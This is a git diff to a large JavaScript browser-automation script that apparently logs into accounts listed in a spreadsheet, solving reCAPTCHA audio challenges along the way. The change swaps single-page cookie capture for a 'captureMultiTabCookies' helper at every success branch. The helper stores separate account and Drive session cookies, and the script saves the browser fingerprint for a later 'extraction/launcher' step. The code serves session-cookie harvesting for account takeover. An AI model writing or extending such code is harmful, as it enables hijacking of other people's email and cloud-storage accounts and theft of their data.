@@ -47,7 +47,8 @@ import {
     solveRecaptchaAudioChallenge,
     clickRecaptchaCheckbox,
     isPageResponsive,
-    parseLocaleDate
+    parseLocaleDate,
+    captureMultiTabCookies
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails, getSheetDataApi, stripFormulaColumns } from '../../../api/googlesheets.js'; // Import getProjectDetails
@@ -5784,9 +5785,11 @@ if (!foundSelector) {
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
 
-                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                                         updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        updateData.cookieJSON = captured.cookieJSON;
+                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -5873,9 +5876,11 @@ if (!foundSelector) {
                                         initialCheckResult.accountAccess = true;
                                         initialCheckResult.emailExists = true;
 
-                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                                         updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        updateData.cookieJSON = captured.cookieJSON;
+                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -6075,9 +6080,11 @@ if (!foundSelector) {
                                         initialCheckResult.accountAccess = true;
                                         initialCheckResult.emailExists = true;
 
-                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                                         updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        updateData.cookieJSON = captured.cookieJSON;
+                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
                                         updateData.verified = true; // Set verified to true on COMPLETED
                                         updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
                                         updateData.cookieAccess = true; // Set cookieAccess to true on COMPLETED
@@ -6166,9 +6173,11 @@ if (!foundSelector) {
                                 initialCheckResult.accountAccess = true;
                                 initialCheckResult.verificationState = null;
 
-                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                                 updateData.status = "PROCESSING_FINALIZING";
-                                updateData.cookieJSON = JSON.stringify(browserCookies);
+                                updateData.cookieJSON = captured.cookieJSON;
+                                if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                                if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
                                 updateData.verified = true; // Set verified to true on COMPLETED
                                 updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
                                 updateData.cookieAccess = true; // Set cookieAccess to true on COMPLETED
@@ -6453,9 +6462,11 @@ if (!foundSelector) {
                                 initialCheckResult.accountAccess = true;
                                 initialCheckResult.verificationState = null;
 
-                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                                 updateData.status = "PROCESSING_FINALIZING";
-                                updateData.cookieJSON = JSON.stringify(browserCookies);
+                                updateData.cookieJSON = captured.cookieJSON;
+                                if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                                if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
                                 updateData.verified = true;
                                 updateData.fullAccess = isInboxFinal;
                                 updateData.cookieAccess = true;
@@ -6499,9 +6510,11 @@ if (!foundSelector) {
                             initialCheckResult.emailExists = true;
                             initialCheckResult.verificationState = null;
 
-                            const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                            const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                             updateData.status = "PROCESSING_FINALIZING";
-                            updateData.cookieJSON = JSON.stringify(browserCookies);
+                            updateData.cookieJSON = captured.cookieJSON;
+                            if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                            if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
                             updateData.verified = true;
                             updateData.fullAccess = true;
                             updateData.cookieAccess = true;
@@ -6973,15 +6986,10 @@ if (!foundSelector) {
 
 
         if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
-            const allUrls = getCookieCaptureUrls(domain);
-            let browserCookies = [];
-            try {
-                browserCookies = await page.cookies(...allUrls);
-            } catch (cookieErr) {
-                logger.warn(`[processRow][${browserId}] Could not capture cookies: ${cookieErr.message}. Proceeding with upload.`);
-            }
-            updateData.cookieJSON = JSON.stringify(browserCookies);
-            logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from all domains.`);
+            const captured = await captureMultiTabCookies(browser, page, domain, browserId);
+            updateData.cookieJSON = captured.cookieJSON;
+            if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+            if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
             // Save the browser identity (fingerprint) so extraction/launcher can reuse it
             if (browser && browser.identity) {
                 try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
